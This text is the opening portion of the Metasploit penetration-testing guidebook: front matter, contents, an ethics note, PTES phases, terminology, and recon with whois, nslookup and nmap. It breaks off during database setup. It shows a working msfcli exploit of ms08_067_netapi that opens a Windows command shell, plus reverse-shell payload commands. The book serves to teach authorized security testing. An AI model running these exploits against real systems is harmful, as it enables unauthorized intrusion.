David Kennedy, Jim O’Gorman, Devon Kearns, and Mati Aharoni
[Word Count: 9]

Metasploit
The Penetration Tester’s Guide
[Word Count: 5]

by David Kennedy, 
Jim O’Gorman, Devon Kearns, 
and Mati Aharoni
[Word Count: 10]

METASPLOIT. Copyright © 2011 by David Kennedy, Jim O'Gorman, Devon Kearns, and Mati Aharoni
[Word Count: 14]

All rights reserved. No part of this work may be reproduced or transmitted in any form or by any means, electronic or 
mechanical, including photocopying, recording, or by any information storage or retrieval system, without the prior 
written permission of the copyright owner and the publisher.
[Word Count: 46]

ISBN-10: 1-59327-288-X
ISBN-13: 978-1-59327-288-3
[Word Count: 4]

Publisher: William Pollock
Production Editor: Alison Law
Cover Illustration: Hugh D’Andrade
Interior Design: Octopod Studios
Developmental Editors: William Pollock and Tyler Ortman
Technical Reviewer: Scott White
Copyeditor: Lisa Theobald
Compositors: Susan Glinert Stevens
Proofreader: Ward Webber
Indexer: BIM Indexing & Proofreading Services
[Word Count: 42]

For information on book distributors or translations, please contact No Starch Press, Inc. directly:
[Word Count: 14]

No Starch Press, Inc.
38 Ringold Street, San Francisco, CA 94103
phone: 415.863.9900; fax: 415.863.9950; info@nostarch.com; www.nostarch.com
[Word Count: 17]

Library of Congress Cataloging-in-Publication Data
A catalog record of this book is available from the Library of Congress.
[Word Count: 18]

No Starch Press and the No Starch Press logo are registered trademarks of No Starch Press, Inc. Other product and 
company names mentioned herein may be the trademarks of their respective owners. Rather than use a trademark 
symbol with every occurrence of a trademarked name, we are using the names only in an editorial fashion and to the 
benefit of the trademark owner, with no intention of infringement of the trademark.
[Word Count: 71]

The information in this book is distributed on an “As Is” basis, without warranty. While every precaution has been 
taken in the preparation of this work, neither the author nor No Starch Press, Inc. shall have any liability to any 
person or entity with respect to any loss or damage caused or alleged to be caused directly or indirectly by the 
information contained in it.
[Word Count: 65]

Foreword by HD Moore................................................................................................ xiii
[Word Count: 5]

Preface .......................................................................................................................xvii
[Word Count: 2]

Acknowledgments .........................................................................................................xix
[Word Count: 2]

Introduction .................................................................................................................xxi
[Word Count: 2]

Chapter 1: The Absolute Basics of Penetration Testing .........................................................1
[Word Count: 9]

Chapter 2: Metasploit Basics............................................................................................7
[Word Count: 4]

Chapter 3: Intelligence Gathering ...................................................................................15
[Word Count: 5]

Chapter 4: Vulnerability Scanning...................................................................................35
[Word Count: 4]

Chapter 5: The Joy of Exploitation...................................................................................57
[Word Count: 6]

Chapter 6: Meterpreter..................................................................................................75
[Word Count: 3]

Chapter 7: Avoiding Detection .......................................................................................99
[Word Count: 5]

Chapter 8: Exploitation Using Client-Side Attacks............................................................109
[Word Count: 6]

Chapter 9: Metasploit Auxiliary Modules .......................................................................123
[Word Count: 6]

Chapter 10: The Social-Engineer Toolkit.........................................................................135
[Word Count: 5]

Chapter 11: Fast-Track.................................................................................................163
[Word Count: 3]

Chapter 12: Karmetasploit ...........................................................................................177
[Word Count: 4]

Chapter 13: Building Your Own Module........................................................................185
[Word Count: 6]

Chapter 14: Creating Your Own Exploits.......................................................................197
[Word Count: 6]

Chapter 15: Porting Exploits to the Metasploit Framework................................................215
[Word Count: 8]

Chapter 16: Meterpreter Scripting.................................................................................235
[Word Count: 4]

Chapter 17: Simulated Penetration Test..........................................................................251
[Word Count: 5]

Appendix A: Configuring Your Target Machines .............................................................267
[Word Count: 7]

Appendix B: Cheat Sheet.............................................................................................275
[Word Count: 4]

Index.........................................................................................................................285
[Word Count: 1]

Special Thanks ........................................................................................................ xx
[Word Count: 4]

Why Do A Penetration Test? ................................................................................... xxii
Why Metasploit? .................................................................................................. xxii
A Brief History of Metasploit ................................................................................... xxii
About this Book .....................................................................................................xxiii
What’s in the Book? ..............................................................................................xxiii
A Note on Ethics ..................................................................................................xxiv
[Word Count: 32]

1
THE ABSOLUTE BASICS OF PENETRATION TESTING
1
[Word Count: 8]

The Phases of the PTES .............................................................................................. 2
Pre-engagement Interactions ......................................................................... 2
Intelligence Gathering .................................................................................. 2
Threat Modeling ......................................................................................... 2
Vulnerability Analysis .................................................................................. 3
Exploitation ................................................................................................ 3
Post Exploitation .......................................................................................... 3
Reporting ................................................................................................... 4
Types of Penetration Tests .......................................................................................... 4
Overt Penetration Testing ............................................................................. 5
Covert Penetration Testing ............................................................................ 5
Vulnerability Scanners .............................................................................................. 5
Pulling It All Together ................................................................................................ 6
[Word Count: 59]

Terminology ............................................................................................................ 7
Exploit ....................................................................................................... 8
Payload ..................................................................................................... 8
Shellcode ................................................................................................... 8
Module ...................................................................................................... 8
Listener ...................................................................................................... 8
Metasploit Interfaces ................................................................................................. 8
MSFconsole ................................................................................................ 9
MSFcli ....................................................................................................... 9
Armitage .................................................................................................. 11
[Word Count: 31]

Metasploit Utilities .................................................................................................. 12
MSFpayload ............................................................................................. 12
MSFencode .............................................................................................. 13
Nasm Shell ............................................................................................... 13
Metasploit Express and Metasploit Pro ...................................................................... 14
Wrapping Up ........................................................................................................ 14
[Word Count: 25]

3
INTELLIGENCE GATHERING
15
Passive Information Gathering ................................................................................. 16
whois Lookups .......................................................................................... 16
Netcraft ................................................................................................... 17
NSLookup ................................................................................................ 18
Active Information Gathering ................................................................................... 18
Port Scanning with Nmap .......................................................................... 18
Working with Databases in Metasploit ........................................................ 20
Port Scanning with Metasploit ..................................................................... 25
Targeted Scanning ................................................................................................. 26
Server Message Block Scanning .................................................................. 26
Hunting for Poorly Configured Microsoft SQL Servers .................................... 27
SSH Server Scanning ................................................................................. 28
FTP Scanning ............................................................................................ 29
Simple Network Management Protocol Sweeping ......................................... 30
Writing a Custom Scanner ...................................................................................... 31
Looking Ahead ...................................................................................................... 33
[Word Count: 88]

5
THE JOY OF EXPLOITATION
57
Basic Exploitation ................................................................................................... 58
msf> show exploits .................................................................................... 58
msf> show auxiliary .................................................................................. 58
[Word Count: 20]

msf> show options .................................................................................... 58
msf> show payloads .................................................................................. 60
msf> show targets ..................................................................................... 62
info ......................................................................................................... 63
set and unset ............................................................................................ 63
setg and unsetg ......................................................................................... 64
save ........................................................................................................ 64
Exploiting Your First Machine .................................................................................. 64
Exploiting an Ubuntu Machine ................................................................................. 68
All-Ports Payloads: Brute Forcing Ports ....................................................................... 71
Resource Files ........................................................................................................ 72
Wrapping Up ........................................................................................................ 73
[Word Count: 58]

Creating Stand-Alone Binaries with MSFpayload ...................................................... 100
Evading Antivirus Detection ................................................................................... 101
Encoding with MSFencode ....................................................................... 102
Multi-encoding ........................................................................................ 103
Custom Executable Templates ................................................................................ 105
Launching a Payload Stealthily................................................................................ 106
[Word Count: 30]

Packers ............................................................................................................... 107
A Final Note on Antivirus Software Evasion ............................................................. 108
[Word Count: 12]

8
EXPLOITATION USING CLIENT-SIDE ATTACKS
109
[Word Count: 6]

Browser-Based Exploits ......................................................................................... 110
How Browser-Based Exploits Work ............................................................ 111
Looking at NOPs ..................................................................................... 112
Using Immunity Debugger to Decipher NOP Shellcode ............................................. 112
Exploring the Internet Explorer Aurora Exploit .......................................................... 116
File Format Exploits .............................................................................................. 119
Sending the Payload ............................................................................................ 120
Wrapping Up ...................................................................................................... 121
[Word Count: 46]

Auxiliary Modules in Use ...................................................................................... 126
Anatomy of an Auxiliary Module ............................................................................ 128
Going Forward .................................................................................................... 133
[Word Count: 17]

Configuring the Social-Engineer Toolkit ................................................................... 136
Spear-Phishing Attack Vector ................................................................................. 137
Web Attack Vectors .............................................................................................. 142
Java Applet ............................................................................................ 142
Client-Side Web Exploits .......................................................................... 146
Username and Password Harvesting .......................................................... 148
Tabnabbing ............................................................................................ 150
Man-Left-in-the-Middle .............................................................................. 150
Web Jacking .......................................................................................... 151
Putting It All Together with a Multipronged Attack ........................................ 153
Infectious Media Generator ................................................................................... 157
Teensy USB HID Attack Vector ............................................................................... 157
Additional SET Features ........................................................................................ 160
Looking Ahead .................................................................................................... 161
[Word Count: 72]

Microsoft SQL Injection ......................................................................................... 164
SQL Injector—Query String Attack ............................................................. 165
SQL Injector—POST Parameter Attack ........................................................ 166
Manual Injection ..................................................................................... 167
MSSQL Bruter ......................................................................................... 168
SQLPwnage ............................................................................................ 172
Binary-to-Hex Generator ........................................................................................ 174
Mass Client-Side Attack ........................................................................................ 175
A Few Words About Automation ............................................................................ 176
[Word Count: 44]

Configuration ...................................................................................................... 178
Launching the Attack ............................................................................................. 179
Credential Harvesting ........................................................................................... 181
Getting a Shell ..................................................................................................... 182
Wrapping Up ...................................................................................................... 184
[Word Count: 21]

Getting Command Execution on Microsoft SQL ........................................................ 186
Exploring an Existing Metasploit Module ................................................................. 187
Creating a New Module ....................................................................................... 189
PowerShell ............................................................................................. 189
Running the Shell Exploit .......................................................................... 190
Creating powershell_upload_exec ............................................................. 192
Conversion from Hex to Binary ................................................................. 192
Counters ................................................................................................ 194
Running the Exploit .................................................................................. 195
The Power of Code Reuse ..................................................................................... 196
[Word Count: 56]

The Art of Fuzzing ................................................................................................ 198
Controlling the Structured Exception Handler ........................................................... 201
Hopping Around SEH Restrictions ........................................................................... 204
Getting a Return Address ...................................................................................... 206
Bad Characters and Remote Code Execution ........................................................... 210
Wrapping Up ...................................................................................................... 213
[Word Count: 37]

15
PORTING EXPLOITS TO THE METASPLOIT FRAMEWORK
215
[Word Count: 8]

Assembly Language Basics .................................................................................... 216
EIP and ESP Registers ............................................................................... 216
The JMP Instruction Set ............................................................................. 216
NOPs and NOP Slides ............................................................................ 216
Porting a Buffer Overflow ...................................................................................... 216
Stripping the Existing Exploit ..................................................................... 218
Configuring the Exploit Definition .............................................................. 219
Testing Our Base Exploit .......................................................................... 220
Implementing Features of the Framework .................................................... 221
Adding Randomization ............................................................................ 222
Removing the NOP Slide .......................................................................... 223
Removing the Dummy Shellcode ................................................................ 223
Our Completed Module ........................................................................... 224
SEH Overwrite Exploit .......................................................................................... 226
Wrapping Up ...................................................................................................... 233
[Word Count: 84]

Meterpreter Scripting Basics .................................................................................. 235
Meterpreter API .................................................................................................... 241
Printing Output ........................................................................................ 241
Base API Calls ........................................................................................ 242
Meterpreter Mixins .................................................................................. 242
Rules for Writing Meterpreter Scripts ...................................................................... 244
Creating Your Own Meterpreter Script .................................................................... 244
Wrapping Up ...................................................................................................... 250
[Word Count: 40]

Pre-engagement Interactions .................................................................................. 252
Intelligence Gathering ........................................................................................... 252
Threat Modeling .................................................................................................. 253
Exploitation ......................................................................................................... 255
Customizing MSFconsole ...................................................................................... 255
Post Exploitation ................................................................................................... 257
Scanning the Metasploitable System .......................................................... 258
Identifying Vulnerable Services ................................................................. 259
Attacking Apache Tomcat ..................................................................................... 260
Attacking Obscure Services ................................................................................... 262
Covering Your Tracks ........................................................................................... 264
Wrapping Up ...................................................................................................... 266
[Word Count: 53]

Installing and Setting Up the System ....................................................................... 267
Booting Up the Linux Virtual Machines .................................................................... 268
Setting Up a Vulnerable Windows XP Installation ..................................................... 269
Configuring Your Web Server on Windows XP ........................................... 269
Building a SQL Server .............................................................................. 269
Creating a Vulnerable Web Application .................................................... 272
Updating Back|Track .............................................................................. 273
[Word Count: 51]

MSFconsole Commands ........................................................................................ 275
Meterpreter Commands ........................................................................................ 277
MSFpayload Commands ....................................................................................... 280
MSFencode Commands ........................................................................................ 280
MSFcli Commands ............................................................................................... 281
MSF, Ninja, Fu .................................................................................................... 281
MSFvenom .......................................................................................................... 281
Meterpreter Post Exploitation Commands ................................................................ 282
[Word Count: 34]

Information technology is a complex field, littered 
with the half-dead technology of the past and an 
ever-increasing menagerie of new systems, software, 
and protocols. Securing today’s enterprise networks 
involves more than simply patch management, fire-
walls, and user education; it requires frequent real-
world validation of what works and what fails. This is 
what penetration testing is all about.
[Word Count: 59]

Penetration testing is a uniquely challenging job. You are paid to think 
like a criminal, to use guerilla tactics to your advantage, and to find the weak-
est links in a highly intricate net of defenses. The things you find can be both 
surprising and disturbing; penetration tests have uncovered everything from 
rogue pornography sites to large-scale fraud and criminal activity.
Penetration testing is about ignoring an organization’s perception of 
its security and probing its systems for weaknesses. The data obtained from a 
successful penetration test often uncovers issues that no architecture review
[Word Count: 93]

HD Moore
Founder, The Metasploit Project
[Word Count: 6]

How can this book help you to get started or take your skills to the next level? 
Each chapter is designed to build on the previous one and to help you build 
your skills as a penetration tester from the ground up.
[Word Count: 42]

z
Chapter 1, “The Absolute Basics of Penetration Testing,” establishes the 
methodologies around penetration testing.
[Word Count: 15]

z
Chapter 2, “Metasploit Basics,” is your introduction to the various tools 
within the Metasploit Framework.
[Word Count: 16]

z
Chapter 3, “Intelligence Gathering,” shows you ways to leverage Meta-
sploit in the reconnaissance phase of a penetration test.
[Word Count: 20]

z
Chapter 4, “Vulnerability Scanning,” walks you through identifying vul-
nerabilities and leveraging vulnerability scanning technology.
[Word Count: 16]

z
Chapter 5, “The Joy of Exploitation,” throws you into exploitation.
[Word Count: 11]

z
Chapter 6, “Meterpreter,” walks you through the Swiss Army knife of 
post exploitation: Meterpreter.
[Word Count: 15]

z
Chapter 7, “Avoiding Detection,” focuses on the underlying concepts of 
antivirus evasion techniques.
[Word Count: 14]

z
Chapter 8, “Exploitation Using Client-Side Attacks,” covers client-side 
exploitation and browser bugs.
[Word Count: 13]

z
Chapter 9, “Metasploit Auxiliary Modules,” walks you through auxiliary 
modules.
[Word Count: 11]

z
Chapter 10, “The Social-Engineer Toolkit,” is your guide to leveraging 
the Social-Engineer Toolkit in social-engineering attacks.
[Word Count: 17]

z
Chapter 11, “Fast-Track,” offers a complete run down on Fast-Track, an 
automated penetration testing framework.
[Word Count: 16]

z
Chapter 12, “Karmetasploit,” shows you how to leverage Karmetasploit 
for wireless attacks.
[Word Count: 13]

z
Chapter 13, “Building Your Own Modules,” teaches you how to build 
your own exploitation module.
[Word Count: 16]

z
Chapter 14, “Creating Your Own Exploits,” covers fuzzing and creating 
exploit modules out of buffer overflows.
[Word Count: 17]

z
Chapter 15, “Porting Exploits to the Metasploit Framework,” is an in-
depth look at how to port existing exploits into a Metasploit-based module.
[Word Count: 24]

z
Chapter 16, “Meterpreter Scripting,” shows you how to create your own 
Meterpreter scripts.
[Word Count: 14]

z
Chapter 17, “Simulated Penetration Test,” pulls everything together as it 
walks you through a simulated penetration test.
[Word Count: 18]

Our goal in writing this book is to help you to improve your skills as a pene-
tration tester. As a penetration tester, you will be bypassing security measures; 
that’s simply part of the job. When you do, keep the following in mind:
[Word Count: 43]

z
Don’t attack targets without written permission.
[Word Count: 7]

z
Consider the consequences of your actions.
[Word Count: 7]

z
If you do things illegally, you can be caught and put in jail!
[Word Count: 14]

Neither the authors of this book nor No Starch Press, its publisher, 
condones or encourages the misuse of the penetration testing techniques 
discussed herein. Our goal is to make you smarter, not to help you to get 
into trouble, because we won’t be there to get you out.
[Word Count: 48]

T H E  A B S O L U T E  B A S I C S  O F  
P E N E T R A T I O N  T E S T I N G
[Word Count: 37]

PTES phases are designed to define a penetration test and assure the client 
organization that a standardized level of effort will be expended in a pene-
tration test by anyone conducting this type of assessment. The standard is 
divided into seven categories with different levels of effort required for each, 
depending on the organization under attack.
[Word Count: 56]

Pre-engagement interactions typically occur when you discuss the scope and terms 
of the penetration test with your client. It is critical during pre-engagement 
that you convey the goals of the engagement. This stage also serves as your 
opportunity to educate your customer about what is to be expected from a 
thorough, full-scope penetration test—one without restrictions regarding what 
can and will be tested during the engagement.
[Word Count: 66]

NOTE
In some cases, it might make sense to run very noisy scans from an entirely different IP 
range other than the one you will be using for the main attack. This will help you deter-
mine how well the organization responds to the tools you are using.
[Word Count: 48]

Threat modeling uses the information you acquired in the intelligence-gathering 
phase to identify any existing vulnerabilities on a target system. When perform-
ing threat modeling, you will determine the most effective attack method,
[Word Count: 33]

The Absolute Basics of Penetration Testing
3
[Word Count: 7]

the type of information you are after, and how the organization might be 
attacked. Threat modeling involves looking at an organization as an adversary 
and attempting to exploit weaknesses as an attacker would.
[Word Count: 33]

Having identified the most viable attack methods, you need to consider how 
you will access the target. During vulnerability analysis, you combine the infor-
mation that you’ve learned from the prior phases and use it to understand 
what attacks might be viable. Among other things, vulnerability analysis takes 
into account port and vulnerability scans, data gathered by banner grabbing, 
and information collected during intelligence gathering.
[Word Count: 65]

Now that you have a basic understanding of the seven PTES categories, let’s 
examine the two main types of penetration tests: overt and covert. An overt 
pen test, or “white hat” test, occurs with the organization’s full knowledge; 
covert tests are designed to simulate the actions of an unknown and unan-
nounced attacker. Both tests offer advantages and disadvantages.
[Word Count: 59]

The Absolute Basics of Penetration Testing
5
[Word Count: 7]

If you’re new to penetration testing or haven’t really adopted a formal 
methodology, study the PTES. As with any experiment, when performing a 
penetration test, ensure that you have a refined and adaptable process that is 
also repeatable. As a penetration tester, you need to ensure that your intelli-
gence gathering and vulnerability analysis are as expert as possible, to give 
you an advantage in adapting to scenarios as they present themselves.
[Word Count: 72]

Throughout this book, we’ll use various terms that first bear some explana-
tion. The majority of the following basic terms are defined in the context of 
Metasploit, but they are generally the same throughout the security industry.
[Word Count: 37]

An exploit is the means by which an attacker, or pen tester for that matter, takes 
advantage of a flaw within a system, an application, or a service. An attacker 
uses an exploit to attack a system in a way that results in a particular desired 
outcome that the developer never intended. Common exploits include buffer 
overflows, web application vulnerabilities (such as SQL injection), and con-
figuration errors.
[Word Count: 68]

A payload is code that we want the system to execute and that is to be selected 
and delivered by the Framework. For example, a reverse shell is a payload that 
creates a connection from the target machine back to the attacker as a Win-
dows command prompt (see Chapter 5), whereas a bind shell is a payload that 
“binds” a command prompt to a listening port on the target machine, which 
the attacker can then connect. A payload could also be something as simple as 
a few commands to be executed on the target operating system.
[Word Count: 97]

Shellcode is a set of instructions used as a payload when exploitation occurs. 
Shellcode is typically written in assembly language. In most cases, a command 
shell or a Meterpreter shell will be provided after the series of instructions 
have been performed by the target machine, hence the name.
[Word Count: 48]

A module in the context of this book is a piece of software that can be used by 
the Metasploit Framework. At times, you may require the use of an exploit 
module, a software component that conducts the attack. Other times, an 
auxiliary module may be required to perform an action such as scanning or 
system enumeration. These interchangeable modules are the core of what 
makes the Framework so powerful.
[Word Count: 70]

A listener is a component within Metasploit that waits for an incoming connection 
of some sort. For example, after the target machine has been exploited, it may 
call the attacking machine over the Internet. The listener handles that connec-
tion, waiting on the attacking machine to be contacted by the exploited system.
[Word Count: 52]

Metasploit offers more than one interface to its underlying functionality, 
including console, command line, and graphical interfaces. In addition to 
these interfaces, utilities provide direct access to functions that are normally 
internal to the Metasploit Framework. These utilities can be invaluable for 
exploit development and situations for which you do not need the flexibility 
of the entire Framework.
[Word Count: 58]

To launch msfconsole, enter msfconsole at the command line:
[Word Count: 9]

root@bt:/# cd /opt/framework3/msf3/
root@bt:/opt/framework/msf3# msfconsole
< metasploit >
 ------------
       \   ,__,
        \  (oo)____
           (__)    )\
              ||--|| *
msf >
[Word Count: 19]

To access msfconsole’s help files, enter help followed by the command 
which you are interested in. In the next example, we are looking for help 
for the command connect, which allows us to communicate with a host. The 
resulting documentation lists usage, a description of the tool, and the various 
option flags.
[Word Count: 52]

We’ll explore MSFConsole in greater depth in the chapters that follow.
[Word Count: 11]

unique exploitation when you know exactly which exploit and options you 
need. It is less forgiving than msfconsole, but it offers some basic help (includ-
ing usage and a list of modes) with the command msfcli -h, as shown here:
[Word Count: 40]

root@bt:/opt/framework3/msf3# msfcli -h
Usage: /opt/framework3/msf3/msfcli <exploit_name> <option=value> [mode]
==============================================================================
[Word Count: 9]

Mode
Description
   ----     
---------------
(H)elp
You're looking at it, baby!
   (S)ummary
Show information about this module
(O)ptions
Show available options for this module
(A)dvanced
Show available advanced options for this module
(I)DS Evasion
Show available ids evasion options for this module
(P)ayloads
Show available payloads for this module
(T)argets
Show available targets for this exploit module
(AC)tions
Show available actions for this auxiliary module
(C)heck
Run the check routine of the selected module
(E)xecute
Execute the selected module
[Word Count: 78]

Let’s take a look at how you might use msfcli. Don’t worry about the details; 
these examples are intended to give you a sense of how you might work with 
this interface.
When you are first learning Metasploit or whenever you get stuck, you 
can see the options available in a module by appending the letter O to the end 
of the string at whichever point you are stuck. For example, in the following 
listing, we use the O to see the options available for the ms08_067_netapi module:
[Word Count: 88]

root@bt:/# msfcli windows/smb/ms08_067_netapi O
[*] Please wait while we load the module tree...
[Word Count: 13]

Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   RHOST    0.0.0.0          yes       The target address
   RPORT    445              yes       Set the SMB service port
   SMBPIPE  BROWSER          yes       The pipe name to use (BROWSER, SRVSVC)
[Word Count: 33]

You can see that the module requires three options: RHOST, RPORT, and 
SMPIPE. Now, by adding a P, we can check for available payloads:
[Word Count: 24]

root@bt:/# msfcli windows/smb/ms08_067_netapi RHOST=192.168.1.155 P
[*] Please wait while we load the module tree...
[Word Count: 14]

Name 
Description
   ---- 
-----------
   generic/debug_trap 
Generate a debug trap in the target process
   generic/shell_bind_tcp 
Listen for a connection and spawn a command shell
[Word Count: 23]

Having set all the required options for our exploit and selecting a pay-
load, we can run our exploit by passing the letter E to the end of the msfcli 
argument string, as shown here:
[Word Count: 35]

root@bt:/# msfcli windows/smb/ms08_067_netapi RHOST=192.168.1.155 PAYLOAD=windows/shell/bind_tcp E
[*] Please wait while we load the module tree...
[*] Started bind handler
[*] Automatically detecting the target...
[*] Fingerprint: Windows XP Service Pack 2 - lang:English
[*] Selected Target: Windows XP SP2 English (NX)
[*] Triggering the vulnerability...
[*] Sending stage (240 bytes)
[*] Command shell session 1 opened (192.168.1.101:46025 -> 192.168.1.155:4444)
[Word Count: 59]

Microsoft Windows XP [Version 5.1.2600]
(C) Copyright 1985-2001 Microsoft Corp.
[Word Count: 10]

We’re successful, because we have received a Windows command 
prompt from the remote system.
[Word Count: 14]

The armitage component of Metasploit is a fully interactive graphical user 
interface created by Raphael Mudge. This interface is highly impressive, 
feature rich, and available for free. We won’t be covering armitage in depth, 
but it is definitely worth mentioning as something to explore. Our goal is 
to teach the ins and outs of Metasploit, and the GUI is awesome once you 
understand how the Framework actually operates.
[Word Count: 68]

To launch armitage, run the command armitage. During startup, select Start 
MSF, which will allow armitage to connect to your Metasploit instance.
[Word Count: 22]

After armitage is running, simply click a menu to perform a particular 
attack or access other Metasploit functionality. For example, Figure 2-1 shows 
the browser (client-side) exploits.
[Word Count: 27]

Figure 2-1: The armitage’s browser exploit menu
[Word Count: 7]

Having covered Metasploit’s three main interfaces, it’s time to cover a few 
utilities. Metasploit’s utilities are direct interfaces to particular features of the 
Framework that can be useful in specific situations, especially in exploit devel-
opment. We will cover some of the more approachable utilities here and 
introduce additional ones throughout the book.
[Word Count: 53]

To see which options the utility takes, enter msfpayload -h at the command 
line, as shown here:
[Word Count: 17]

As with msfcli, if you find yourself stuck on the required options for a pay-
load module, append the letter O on the command line for a list of required 
and optional variables, like so:
[Word Count: 35]

root@bt:/# msfpayload windows/shell_reverse_tcp O
[Word Count: 4]

We will dive much deeper into msfpayload as we explore exploit develop-
ment in later chapters.
[Word Count: 16]

The nasm_shell.rb utility can be handy when you’re trying to make sense of 
assembly code, especially if, during exploit development, you need to iden-
tify the opcodes (the assembly instructions) for a given assembly command.
[Word Count: 35]

For example, here we run the tool and request the opcodes for the jmp 
esp command, which nasm_shell tells us is FFE4.
[Word Count: 22]

root@bt:/opt/framework3/msf3/tools# ./nasm_shell.rb
[Word Count: 2]

nasm > jmp esp
00000000  FFE4              jmp esp
[Word Count: 8]

In this chapter, you learned a little bit of the basics of the Metasploit Frame-
work. As you progress through this book, you will begin using these tools in a 
much more advanced capacity. You’ll find a few different ways to accomplish 
the same tasks using different tools. It will ultimately be up to you to decide 
which tool best suits your needs.
Now that you have the basics under control, let’s move to the next phase 
of the pen testing process: discovery.
[Word Count: 83]

I N T E L L I G E N C E  G A T H E R I N G
[Word Count: 21]

WARNING 
If you follow the procedures in this chapter, you can actually damage your system and 
your target’s system, so be sure to set up your test environment now. (For help, see 
Appendix A.) Many of the examples in these chapters can be destructive and make a 
target system unusable. The activities discussed in this chapter could be considered 
illegal if they are undertaken by someone with bad intentions, so follow the rules and 
don’t be stupid.
[Word Count: 77]

Let’s begin by using Back|Track’s whois lookup to find the names of 
secmaniac.net’s domain servers.
[Word Count: 15]

msf > whois secmaniac.net
[*] exec: whois secmaniac.net
[Word Count: 8]

Registered through: GoDaddy.com, Inc. (http://www.godaddy.com)
   Domain Name: SECMANIAC.NET
      Created on: 03-Feb-10
      Expires on: 03-Feb-12
      Last Updated on: 03-Feb-10
[Word Count: 18]

XDomain servers in listed order:
      NS57.DOMAINCONTROL.COM
      NS58.DOMAINCONTROL.COM
[Word Count: 7]

Netcraft (http://searchdns.netcraft.com/) is a web-based tool that we can use to find 
the IP address of a server hosting a particular website, as shown in Figure 3-1.
[Word Count: 27]

Figure 3-1: Use Netcraft to find the IP address of the server hosting a particular website.
[Word Count: 16]

Having identified secmaniac.net’s IP address as 75.118.185.142, we do 
another whois lookup on that IP address:
[Word Count: 16]

msf > whois 75.118.185.142
[*] exec: whois 75.118.185.142
WideOpenWest Finance LLC WIDEOPENWEST (NET-75-118-0-0-1)
                                  75.118.0.0 - 75.118.255.255
WIDEOPENWEST OHIO WOW-CL11-1-184-118-75 (NET-75-118-184-0-1)
                                  75.118.184.0 - 75.118.191.255
[Word Count: 23]

We see from the whois lookup and a quick search that this IP 
(WIDEOPENWEST) appears to be a legitimate service provider. While 
the actual subnet range isn’t specifically registered to secmaniac.net or 
secmaniac.com, we can tell that this site appears to be hosted inside the 
author’s home, because the IP block appears to be part of a residential 
range.
[Word Count: 59]

To get additional server information, we’ll use Back|Track to leverage nslookup, a 
tool built into most operating systems, to find information about secmaniac.net.
[Word Count: 23]

root@bt:~# nslookup
set type=mx
> secmaniac.net
Server:         172.16.32.2
Address:        172.16.32.2#53
[Word Count: 10]

Non-authoritative answer:
secmaniac.net   mail exchanger = 10 mailstore1.secureserver.net.
secmaniac.net   mail exchanger = 0 smtp.secureserver.net.
[Word Count: 14]

We see in this listing that the mail servers are pointing to mailstore1
.secureserver.net and smtp.secureserver.net. Some quick research on these mail 
servers tells us that this website is hosted by a third party, which would not 
be within the scope of our penetration test.
At this point, we have gathered some valuable information that we might 
be able to use against the target later on. Ultimately, however, we have to 
resort to active information gathering techniques to determine the actual 
target IP, which is 75.118.185.142.
[Word Count: 86]

NOTE
Passive information gathering is an art that is not easily mastered in just a few pages 
of discussion. See the Penetration Testing Execution Standard (PTES; http://
www.pentest-standard.org/) for a list of potential ways to perform additional pas-
sive intelligence gathering.
[Word Count: 41]

In active information gathering, we interact directly with a system to learn 
more about it. We might, for example, conduct port scans for open ports on 
the target or conduct scans to determine what services are running. Each system 
or running service that we discover gives us another opportunity for exploita-
tion. But beware: If you get careless while active information gathering, you 
might be nabbed by an IDS or intrusion prevention system (IPS)—not a 
good outcome for the covert penetration tester.
[Word Count: 82]

Having identified the target IP range with passive information gathering as 
well as the secmaniac.net target IP address, we can begin to scan for open ports 
on the target by port scanning, a process whereby we meticulously connect to 
ports on the remote host to identify those that are active. (Obviously, in a 
larger enterprise, we would have multiple IP ranges and things to attack 
instead of only one IP.)
Nmap is, by far, the most popular port scanning tool. It integrates with 
Metasploit quite elegantly, storing scan output in a database backend for
[Word Count: 94]

root@bt:~# nmap -sS -Pn 172.16.32.131
Nmap scan report for 172.16.32.131
Host is up (0.00057s latency).
Not shown: 990 closed ports
PORT     STATE SERVICE
21/tcp   open  ftp
25/tcp   open  smtp
80/tcp   open  http
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
443/tcp  open  https
445/tcp  open  microsoft-ds
1025/tcp open  NFS-or-IIS
1433/tcp open  ms-sql-s
3389/tcp open  ms-term-serv
Nmap done: 1 IP address (1 host up) scanned in 14.34 seconds
[Word Count: 65]

As you can see, nmap reports a list of open ports, along with a description 
of the associated service for each.
For more detail, try using the -A flag. This option will attempt advanced 
service enumeration and banner grabbing, which may give you even more 
details about the target system. For example, here’s what we’d see if we were 
to call nmap with the -sS and -A flags, using our same target system:
[Word Count: 73]

root@bt:~# nmap -Pn -sS -A 172.16.32.131
Nmap scan report for 172.16.32.131
Host is up (0.0035s latency).
Not shown: 993 closed ports
PORT     STATE SERVICE      VERSION
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds Microsoft Windows XP microsoft-ds
[Word Count: 41]

777/tcp  open  unknown
1039/tcp open  unknown
1138/tcp open  msrpc        Microsoft Windows RPC
1433/tcp open  ms-sql-s     Microsoft SQL Server 2005 9.00.1399; RTM
[Word Count: 21]

Device type: general purpose
Running: Microsoft Windows XP|2003
OS details: Microsoft Windows XP Professional SP2 or Windows Server 2003
Network Distance: 1 hop
Service Info: OS: Windows
[Word Count: 27]

Host script results:
|_nbstat: NetBIOS name: V-MAC-XP, NetBIOS user: <unknown>, NetBIOS MAC:
00:0c:29:c9:38:4c (VMware)
|_smbv2-enabled: Server doesn't support SMBv2 protocol
| smb-os-discovery:
[Word Count: 22]

|   OS: Windows XP (Windows 2000 LAN Manager)
|   Name: WORKGROUP\V-MAC-XP
[Word Count: 11]

When you’re running a complex penetration test with a lot of targets, keep-
ing track of everything can be a challenge. Luckily, Metasploit has you cov-
ered with expansive support for multiple database systems.
To ensure that database support is available for your system, you should 
first decide which database system you want to run. Metasploit supports 
MySQL and PostgreSQL; because PostgreSQL is the default, we’ll stick with 
it in this discussion.
First, we start the database subsystem using the built-in Back|Track init.d 
scripts.
[Word Count: 84]

root@bt~# /etc/init.d/postgresql-8.3 start
[Word Count: 3]

After PostgreSQL has started, we tell the Framework to connect to the 
database instance. This connection requires a username, password, name of 
the host on which the database is running, and the database name we want to 
use. Back|Track’s default PostgreSQL username is postgres with the password 
toor, but we’ll use msfbook as the database name. Let’s make the connection.
[Word Count: 60]

msf > db_connect postgres:toor@127.0.0.1/msfbook
[Word Count: 4]

If this were the first time we connected to the database name, we would 
